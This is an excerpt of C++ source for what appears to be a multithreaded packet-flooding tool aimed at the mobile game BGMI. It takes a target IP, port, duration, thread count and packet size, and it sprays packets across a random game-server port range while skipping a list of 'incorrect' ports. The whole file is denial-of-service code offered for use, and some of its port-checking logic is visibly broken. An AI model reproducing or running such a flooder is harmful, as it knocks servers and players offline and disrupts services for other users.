...
#define BGMI_PORT_RANGE_START 16000
#define BGMI_PORT_RANGE_END 65535

// Set of incorrect ports to avoid
const std::set<int> INCORRECT_PORTS = {443, 8700, 17500, 9031, 20000, 20001, 20002};
...
bool isSequentialPort(int port) {
    std::string portStr = std::to_string(port);
    // Check for repeating digits (e.g., 28882 has '888')
    std::regex repeatingDigits(R"((\d)\1{2,})");
    if (std::regex_search(portStr, repeatingDigits)) {
        return true;
    }
    // Check for simple patterns like 10000, 20000
    if (portStr.length() >= 3 && (portStr.substr(portStr.length() - 3) == "000" || portStr.substr(portStr.length() - 2) == "00")) {
        return true;
    }
    // Check for incremental patterns (e.g., 20000, 20001)
    for (int i = port - 5; i <= port + 5; ++i) {
        if (i != port && std::to_string(i) == portStr) {
            return true;
        }
    }
    return false;
...
void packetSender(int threadId, const std::string& targetIp, int targetPort, int durationSeconds, int packetSize, int numThreads, bool useRandomPorts) {
    ...
    while (keepSending.load(std::memory_order_relaxed)) {
        ...
        if (useRandomPorts) {
            do {
                port = portDist(gen);
            } while (INCORRECT_PORTS.count(port) > 0);
        } else {
            port = targetPort;
        }
...
int main(int argc, char* argv[]) {
    ...
    bool useRandomPorts = true; // Default to random ports from BGMI range
    if (argc == 7 && std::string(argv[6]) == "--fixed-port") {
        useRandomPorts = false;
        argc = 6; // Ignore the extra argument for compatibility
    }

    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <threads> <packet_size> [--fixed-port]\n";
        return 1;
    }
    ...
    // Port validation for fixed port
    if (!useRandomPorts) {
        if (INCORRECT_PORTS.count(targetPort) > 0 || isSequentialPort(targetPort)) {
            std::cerr << "Error: This is a wrong port\n";
            return 1;
        }
    }
    ...
    for (int i = 0; i < numThreads; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize, numThreads, useRandomPorts);
    }
